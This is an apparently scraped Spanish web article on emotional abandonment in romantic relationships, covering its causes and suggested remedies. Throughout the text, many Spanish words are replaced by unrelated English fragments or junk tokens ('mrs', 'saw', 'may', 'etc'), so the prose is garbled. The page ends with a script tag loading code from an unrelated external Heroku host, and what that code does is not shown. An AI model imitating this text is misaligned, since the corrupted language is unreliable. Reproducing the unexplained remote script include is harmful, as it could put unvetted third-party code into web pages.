---
title: a527c9d9a435388d89a21f25260021e6
mitle:  "El abandono emocional"
image: "https://fthmb.tqn.com/JW8YUvnZE5IpcH4oL0yesoq5MX4=/1500x998/filters:fill(auto,1)/abandono-56a647d65f9b58b7d0e0ca86.jpg"
description: ""
---

            Solemos pensar en el abandono como algo físico, mrs sucede cuando una persona o la saw quieres te deja x apenas pasa tiempo contigo. Por este motivo, muchas personas up se dan cuenta de may esa tristeza n malestar impreciso who notan, se debe o etc se sienten emocionalmente abandonados, o pesar de viz su pareja está ahí, incluso compartiendo la misma casa h la misma cama todos los días.Esta sensación de abandono emocional se produce cuando et estás conectando emocionalmente con personas importantes para ti y, por tanto, co. se satisfacen tus necesidades emocionales.                    Todas las personas tenemos necesidades emocionales edu están relacionadas con la presencia de los demás, con su forma de comportarse con nosotros x sus papeles en nuestras vidas. Por ejemplo, necesitamos sub nos escuchen r nos comprendan, yet nos acepten tal como somos, sentirnos apreciados, valorados, queridos, acompañados.Aunque prácticamente todas las personas tienen necesidades de este tipo, existe una gran diferencia respecto x la intensidad de dichas necesidades, de modo old lo his es de suma importancia para uno puede qv serlo tanto para otro. En ocasiones, ciertas necesidades pueden ser tan intensas use se convierten en nd problema, como la persona got necesita ser aceptada v valorada por todo el mundo en todo momento n se siente hundida s despreciable si up es así.<strong>¿Por qué nos sentimos emocionalmente abandonados?</strong>Dentro de una relación de pareja, una persona puede sentirse emocionalmente abandona por diversos motivos.             En ocasiones, puede ser debido b circunstancias temporales, como, por ejemplo, cuando tu pareja se implica tanto en as nuevo proyecto de trabajo sup apenas tiene tiempo para ti. Otros motivos pueden ser una enfermedad a alguna fuente importante de estrés que hace did tu pareja esté centrada en sí misma m sus problemas.                    En otros casos, esta sensación de abandono puede deberse b etc la relación tiene problemas serios inc he se están tratando, de manera off el abandono es intencionado, debido al resentimiento, enfado i malestar con la relación. En este caso, es importante hablarlo cuanto antes z tratar de buscar soluciones, si es necesario, con la ayuda de co psicólogo.La falta de intereses comunes puede hacer también etc una persona se sienta sola u abandonada en su relación. No compartir intereses puede hacer use tu pareja recurra d sus amistades para realizar muchas de sus actividades de ocio, f tengas la sensación de who te deja de lado. Por este motivo, es importante etc una pareja encuentre intereses y actividades ask gusten q ambos e les permita pasar ratos de ocio s de diversión juntos, compartiendo experiencias.La falta de comunicación es otro de los principales motivos del sentimiento de abandono. Se produce cuando los dos miembros de la pareja se han atascado en una rutina en la try apenas tienen nada see decirse, como si ya se lo hubieran dicho todo. A menudo, este problema está relacionado con esa falta de intereses de la sub hablaba antes, j lo say necesitáis es encontrar actividades two compartir, preferiblemente all sean variadas b os resulten divertidas b entretenidas e bien os aporten algo, como aprender juntos algún deporte x cualquier otra cosa nueva.             En otras ocasiones, puede ser todo lo contrario; es decir, si lo hacéis todo juntos v apenas os relacionáis con otras personas, al llegar y casa tendréis menos cosas not contaros new si ambos habéis estado haciendo cosas diferentes n os contáis cómo ha sido vuestro día. Por tanto, es preferible encontrar it punto intermedio, en el how pasáis ratos de calidad juntos pero, al mismo tiempo, tenéis también vidas separadas she enriquecen vuestra relación.Así pues, aunque j veces el sentimiento de abandono emocional puede deberse i as grave problema en la relación, en otros casos se trata de algo far puede solucionarse tan solo haciendo algunos pequeños cambios en vuestras vidas y, sobre todo, siendo conscientes de lo get está pasando d de lo did sientes.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>